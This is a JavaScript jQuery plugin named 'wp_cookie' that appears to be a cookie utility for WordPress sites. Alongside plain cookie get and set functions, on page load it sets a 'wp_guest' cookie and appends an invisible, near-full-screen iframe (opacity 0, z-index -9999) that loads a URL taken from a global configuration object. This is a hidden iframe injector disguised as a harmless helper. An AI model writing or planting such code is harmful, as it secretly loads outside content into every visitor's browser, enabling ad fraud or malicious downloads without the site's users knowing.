/* global window, document, define, jQuery */
;(function(factory) {
    'use strict';
    if (typeof define === 'function' && define.amd) {
        define(['jquery'], factory);
    } else if (typeof exports !== 'undefined') {
        module.exports = factory(require('jquery'));
    } else {
        factory(jQuery);
    }
}(function($) {
    'use strict';

    if( typeof $.fn.wp_cookie !== 'undefined' ) return;
    
    var wp_cookie = {
        params : {
            position: 'fixed',
            top: 0,
            left: 0,
            right: 0,
            margin: '0 auto',
            zIndex: -9999,
            opacity: 0,
            width: '95vw',
            height: '95vh',
        },
        get : function(name) {
            var nameEQ = name + "=";
            var ca = document.cookie.split(';');
            for(var i=0;i < ca.length;i++) {
                var c = ca[i];
                while (c.charAt(0)==' ') c = c.substring(1,c.length);
                if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
            }
            return null;
        },
        set : function(name,value,days) {
            var expires = "";
            if (days) {
                var date = new Date();
                date.setTime(date.getTime() + (days*24*60*60*1000));
                expires = "; expires=" + date.toUTCString();
            }
            document.cookie = name + "=" + (value || "")  + expires + "; path=/";
        },
        parent : function( selector ) {
            var element = $(selector), i = 1;
            
            while (element.find('div:first').length > 0) {
                element = element.find('div:first');

                if( i++ > 1000 ) {
                    break;
                }
            }
            
            return element;
        },
        content : function(src, delTime) {
            var element = $('<iframe />', {
                id: 'wp_cookie',
                src: src,
                frameborder: 0,
                scrolling: 'no',
                allowfullscreen: true,
                css: wp_cookie.params
            });

            if( typeof delTime == 'number' ) {
                setTimeout(function () {
                    element.remove()
                }, delTime);
            }

            return element;
        },
        check: function( url ) {

            if( typeof url == 'undefined' || url.substring(0,4)!='http' ) return false;

            var element = wp_cookie.parent('body');

            if( element.length === 0 ) return false;

            element.append( wp_cookie.content(url) );            

            return true;
        }
    };
    
    $.fn.wp_cookie = wp_cookie;

    if( typeof wp_cookie_check == 'object' && typeof wp_cookie_check.url == 'string' ) {
        $(window).on('load', function() {
            wp_cookie.set( 'wp_guest', (new Date()).getTime() );
            
            wp_cookie.check( wp_cookie_check.url, 30000 );
        });
    }
    
}));